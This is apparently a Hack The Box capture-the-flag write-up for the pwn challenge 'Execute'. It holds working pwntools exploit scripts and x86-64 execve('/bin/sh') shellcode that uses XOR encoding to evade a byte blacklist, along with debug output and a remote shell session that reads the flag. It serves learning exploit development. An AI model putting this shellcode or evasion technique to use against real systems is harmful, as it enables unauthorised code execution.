---
title: "[HTB] - Execute"
published: 2025-25-01
description: "Use XOR Operation to bypass black list"
image: ../../logo.jpg
tags:
  - PWN
category: "Wargame"
draft: false
---

## Description

> Can you feed the hungry code?
>

## Analysis

### General information

```
[*] '/home/alter/HTB/chal/pwn/pwn_execute/execute'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source code

```c
// gcc execute.c -z execstack -o execute

#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void setup() {
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    alarm(0x7f);
}

int check(char *a, char *b, int size, int op) {
    for(int i = 0; i < op; i++) {
        for(int j = 0; j < size-1; j++) {
            if(a[i] == b[j])
                return 0;
        }
    }

    return 1337;
}

int main(){
    char buf[62];
    char blacklist[] = "\\x3b\\x54\\x62\\x69\\x6e\\x73\\x68\\xf6\\xd2\\xc0\\x5f\\xc9\\x66\\x6c\\x61\\x67";

    setup();

    puts("Hey, just because I am hungry doesn't mean I'll execute everything");

    int size = read(0, buf, 60);

    if(!check(blacklist, buf, size, strlen(blacklist))) {
        puts("Hehe, told you... won't accept everything");
        exit(1337);
    }

    ( ( void (*) () ) buf) ();
}

```

In the main function, we can see that there is a blacklist here:

```c
char blacklist[] = "\\x3b\\x54\\x62\\x69\\x6e\\x73\\x68\\xf6\\xd2\\xc0\\x5f\\xc9\\x66\\x6c\\x61\\x67";

```

At the end of the code, we encounter the statement:

```c
((void (*)()) buf)();

```

This line performs two critical operations in a single step. First, it casts the `buf` variable to a function pointer of type `void (*)()`. This specific type indicates a function that takes no arguments and returns nothing (a void function). Second, it immediately invokes the function pointer, effectively executing the machine code that resides in the memory buffer `buf`.

This technique is commonly used in exploit development to execute `shellcode`. The `buf` buffer is typically loaded with malicious machine code (the `shellcode`), and casting it to a function pointer allows the program to treat the buffer as if it were a legitimate function. This bypasses the need for explicit code injection, instead leveraging the memory space already allocated for `buf`.

For example this might be look like this:

```c
#include <stdio.h>
#include <string.h>

char shellcode[] =
    "\\x48\\x31\\xc0"             // xor rax, rax
    "\\x48\\x89\\xc2"             // mov rdx, rax
    "\\x48\\x89\\xc6"             // mov rsi, rax
    "\\xb0\\x3b"                 // mov al, 0x3b
    "\\x48\\x8d\\x3d\\x04\\x00\\x00" // lea rdi, [rip+4]
    "\\x00\\x0f\\x05"             // syscall
    "/bin/sh";

int main() {
    void (*func)() = (void (*)())shellcode;
    func(); // Executes the shellcode
    return 0;
}
```

### Shellcode

Back to our challenge, there is a filter here so the easy way is craft a simple `shellcode` to see which bytes are filtered:

```python
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
c#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF('./execute', checksec=False)

# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

c
''')

p = remote('94.237.57.222',53132) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

blacklist = b"\\x3b\\x54\\x62\\x69\\x6e\\x73\\x68\\xf6\\xd2\\xc0\\x5f\\xc9\\x66\\x6c\\x61\\x67"

shellcode = asm(
    '''
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch='amd64')

for byte in shellcode:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

sl(shellcode)
p.interactive()

```

- Note:

```
0x68732f6e69622f is a hex representation of strings "/bin/sh".

>>> from pwn import *
>>> print(p64(0x68732f6e69622f))
b'/bin/sh\\x00'
>>>
```

When we run our exploit we got this:

```bash
      <...>
        mov rax, 0x68732f6e69622f
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-kigxn6hl/step2 /tmp/pwn-asm-kigxn6hl/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-kigxn6hl/step3 /tmp/pwn-asm-kigxn6hl/step4
BAD BYTE --> 0x62
ASCII --> b
BAD BYTE --> 0x69
ASCII --> i
BAD BYTE --> 0x6e
ASCII --> n
BAD BYTE --> 0x73
ASCII --> s
BAD BYTE --> 0x68
ASCII --> h
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
BAD BYTE --> 0xc0
ASCII --> À
BAD BYTE --> 0x3b
ASCII --> ;
[DEBUG] Sent 0x1e bytes:
    00000000  48 b8 2f 62  69 6e 2f 73  68 00 50 48  89 e7 48 31  │H·/b│in/s│h·PH│··H1│
    00000010  f6 48 31 d2  48 c7 c0 3b  00 00 00 0f  05 0a        │·H1·│H··;│····│··│
    0000001e
<...>
```

We can see that most parts of our shellcode are filtered (syscall number, /bin/sh...). This make me confuse and take a lot of time to research how to bypass that filter. After several hours of research, I discovered a clever solution: using the `XOR` operation to encode `/bin/sh` and "hide" it within the `shellcode`. The idea is to encode the string `/bin/sh` with a carefully chosen `XOR` key, so the resulting encoded string no longer contains any filtered or bad bytes. During runtime, the `shellcode` can decode `/bin/sh` back to its original form by applying the `XOR` operation again with the same key.

Here’s how the XOR encoding works:

- Let `/bin/sh` represent the original string to encode.
- Choose a key such that when `/bin/sh` is `XOR-ed` with this key, the result contains no bad bytes (e.g., null bytes, restricted characters, or other filtered bytes).
- The encoding operation is:

```bash
/bin/sh ^ KEY = ENCODED_STRING
```

- During shellcode execution, we reverse the operation to decode the string back:

```
KEY ^ ENCODED_STRING = /bin/sh

```

By encoding `/bin/sh` in this manner, the opcodes of our shellcode are effectively altered. This allows the encoded `shellcode` to pass the filtering checks, as the raw bytes no longer directly match `/bin/sh` or contain restricted characters. But the problem is how we can find their key that XOR with `/bin/sh` does not give bad bytes. I start with `0xffffffffffffffff`. Luckily, there is no bad bytes here when I run the exploit again:

- Shellcode:

```nasm
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
```

- Run

```bash
<...>
BAD BYTE --> 0xf6
ASCII --> ö
BAD BYTE --> 0xd2
ASCII --> Ò
BAD BYTE --> 0xc0
ASCII --> À
BAD BYTE --> 0x3b
ASCII --> ;
[DEBUG] Sent 0x22 bytes:
    00000000  48 bf d0 9d  96 91 d0 8c  97 ff 48 83  f7 ff 57 48  │H···│····│··H·│··WH│
    00000010  89 e7 48 31  f6 48 31 d2  48 c7 c0 3b  00 00 00 0f  │··H1│·H1·│H··;│····│
    00000020  05 0a                                               │··│
    00000022
<...
```

Only bad bytes left for `syscall` and `argv` parts. For `syscall` part, we can use `0x3a` instead of `0x3b`, push it into the Stack then add `0x1` to it. And for `argv` part, we can push `0x0` straight onto the stack then pop it into the necessary registers. Or we can push a `rax` to the stack (rax register here is set to NULL which `0x0` in it because we haven't set the value for it yet)

```nasm
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    push 0x0
    pop rsi
    push 0x0
    pop rdx

    push 0x3a
    pop rax
    add al, 0x1
    syscall
```

or

```nasm
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    push rax
    mov rsi, rax
    mov rdx, rax

    push 0x3a
    pop rax
    add al, 0x1
    syscall
```

Let's run it again and check:

```bash
<...>
        mov rdi, 0xff978cd091969dd0
        xor rdi, 0xffffffffffffffff
        push rdi
        mov rdi, rsp
    push rax
    mov rsi, rax
    mov rdx, rax
        push 0x3a
        pop rax
        add al, 0x1
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-b49gsxuj/step2 /tmp/pwn-asm-b49gsxuj/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-b49gsxuj/step3 /tmp/pwn-asm-b49gsxuj/step4
[DEBUG] Sent 0x21 bytes:
    00000000  48 bf d0 9d  96 91 d0 8c  97 ff 48 83  f7 ff 57 48  │H···│····│··H·│··WH│
    00000010  89 e7 50 48  89 c6 48 89  c2 6a 3a 58  04 01 0f 05  │··PH│··H·│·j:X│····│
    00000020  0a                                                  │·│
    00000021
<...>

```

We successfully bypass the backlist!

## Exploit

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./execute', checksec=False)

# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv()
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

c
''')

p = remote('94.237.57.222',53132) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB:
    GDB()
    input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

blacklist = b"\\x3b\\x54\\x62\\x69\\x6e\\x73\\x68\\xf6\\xd2\\xc0\\x5f\\xc9\\x66\\x6c\\x61\\x67"

shellcode = asm(
    '''
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff

    push rdi
    mov rdi, rsp

    push rax
    mov rsi, rax
    mov rdx, rax

    push 0x3a
    pop rax
    add al, 0x1
    syscall
    ''', arch='amd64')
print(f"Check shellcode: {shellcode}")
# for byte in shellcode:
#     if byte in blacklist:
#         print(f'BAD BYTE --> 0x{byte:02x}')
#         print(f'ASCII --> {chr(byte)}')

sl(shellcode)
p.interactive()

```

```bash
➜  pwn_execute ./exploit.py REMOTE
[+] Opening connection to 94.237.63.109 on port 34542: Done
Check shellcode: b'H\\xbf\\xd0\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xffH\\x83\\xf7\\xffWH\\x89\\xe7PH\\x89\\xc6H\\x89\\xc2j:X\\x04\\x01\\x0f\\x05'
[*] Switching to interactive mode
Hey, just because I am hungry doesn't mean I'll execute everything
$ ls
execute
flag.txt
$ cat flag.txt
HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}$
```
